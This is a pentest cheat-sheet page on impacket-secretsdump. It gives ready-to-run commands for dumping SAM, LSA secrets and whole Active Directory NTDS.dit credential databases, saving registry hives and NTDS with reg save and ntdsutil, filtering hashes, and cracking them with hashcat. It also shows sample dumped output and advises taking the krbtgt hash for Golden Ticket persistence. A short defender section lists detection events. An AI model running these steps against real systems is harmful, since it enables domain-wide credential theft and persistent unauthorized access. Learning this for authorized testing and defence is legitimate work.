---
tags: [pentest, impacket, secretsdump, credentials, ntds, sam, active-directory, initial-access, windows]
tool: impacket-secretsdump
phase: 5
---
# secretsdump

The credential goldmine. Dumps:
- **SAM** - local accounts (NTLM hashes)
- **LSA secrets** - cached creds, service account passwords, machine account password
- **NTDS.dit** - the entire domain credential database when run against a DC (or its files)

[[06 - Gaining Access/00 - README|Folder index]]

## Run against a live host

```bash
# As local admin
impacket-secretsdump -hashes :<NTLM> corp.local/admin@10.0.0.5
impacket-secretsdump corp.local/admin:pass@10.0.0.5

# As DA against a DC (pulls NTDS via DCSync - the cleanest method)
impacket-secretsdump -just-dc corp.local/DA:pass@10.0.0.10
impacket-secretsdump -just-dc-user krbtgt corp.local/DA:pass@10.0.0.10

# Only NTDS, history, NTLM:
impacket-secretsdump -just-dc-ntlm corp.local/DA:pass@10.0.0.10
```

## Run offline (against saved hives / NTDS)

After exfiltrating registry hives or NTDS.dit:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

How to grab the source files:

```cmd
:: From within a SYSTEM shell on the box
reg save HKLM\SAM     C:\Windows\Temp\SAM
reg save HKLM\SYSTEM  C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY

:: NTDS.dit (on a DC) - use ntdsutil OR Volume Shadow Copy
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\loot" q q
```

```powershell
# PowerShell version (Server 2012+)
New-Item -ItemType Directory C:\Temp\loot
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\loot" q q

# Then download:
#   - C:\Temp\loot\Active Directory\ntds.dit
#   - C:\Temp\loot\registry\SYSTEM
```

## Output anatomy

```text
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:...
SUPPORT_388945a0:1001:...:c4d4a0eddc...:::

[*] Dumping cached domain logon information (domain/username:hash)
CORP.LOCAL/bob:$DCC2$10240#bob#abc123...

[*] Dumping LSA Secrets
[*] $MACHINE.ACC
CORP\SRV01$:aad3b435...:5cd7b6928e8a6e0c8b3d6e0c8b3d6e0c:::
[*] DefaultPassword
CORP\Administrator:Hunter2!

[*] Dumping NTDS.dit hashes (Format: domain\username:RID:lmhash:nthash)
CORP.LOCAL\krbtgt:502:aad3b435...:79e85a3...:::
CORP.LOCAL\alice:1103:...:cracked_via_hashcat:::
```

## What to grab when output is huge

```bash
# All Domain Admin NTLMs
grep -E ':500:|Domain Admins' loot.txt

# Just the NTDS user:hash for cracking
impacket-secretsdump ... 2>/dev/null | grep -E '^[^:]+:[0-9]+:[a-f0-9]{32}:[a-f0-9]{32}:::' > ntds-hashes.txt

# Skip machine accounts (ends with $)
grep -vE '\\\$:' ntds-hashes.txt > users-only.txt

# Get just user:nthash
awk -F: '{print $1":"$4}' users-only.txt > pass-the-hash-table.txt
```

## Crack the NTDS dump

```bash
# Extract just the hashes (4th field) for hashcat
awk -F: '{print $4}' ntds-hashes.txt | sort -u > ntlm.txt
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntlm.txt rockyou.txt -r best64.rule
hashcat -m 1000 ntlm.txt rockyou.txt -r OneRuleToRuleThemAll.rule

# After cracking, correlate back to usernames
hashcat -m 1000 ntlm.txt --show
```

## DCSync vs. NTDS file dump

| Method | Pros | Cons |
| --- | --- | --- |
| `secretsdump -just-dc` (DCSync) | No disk artifacts on DC; clean | Generates Event ID 4662 (object access); detection-friendly |
| `ntdsutil ifm` + offline | No DCSync logs | Files on disk, ntdsutil execution logged, requires SYSTEM on DC |
| VSS shadow copy + copy ntds.dit | Like ifm | Requires admin on DC |

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| `Cannot connect to RemoteRegistry` | Service stopped. `services.py` or `sc start RemoteRegistry` from a session. |
| `STATUS_ACCESS_DENIED` on SAM | Not local admin. Confirm with `nxc smb <ip> -u user -p pass` - should show `Pwn3d!`. |
| Garbage hex in NT hash field (looks like `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`) | This is the EMPTY NTLM hash (`aad3...` = LM empty, `31d6...` = NTLM empty). The account has no password set. |
| NTDS dump is empty | Wrong cred type (need DA / Replicating Directory Changes / Replicating Changes All). |
| Tool says "Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN" | Use the DC's FQDN, not IP; add to /etc/hosts. |

## Defender's view

- Event ID **4662** on the DC for DCSync (look for "Replicating Directory Changes" GUID).
- Event ID **4624** Type 3 from non-DC IP to DC after a DCSync.
- Audit policy: **DS Access > Directory Service Replication Subcategory**.
- Lock down "Replicating Directory Changes" rights to actual DCs.
- LSASS Protected Process Light + Credential Guard mitigate LSASS dumping.

> [!tip] The hash that matters most
> `krbtgt`. With it you can mint Golden Tickets indefinitely. ALWAYS pull the krbtgt hash when you achieve DA - it's your persistence escape hatch for the writeup.
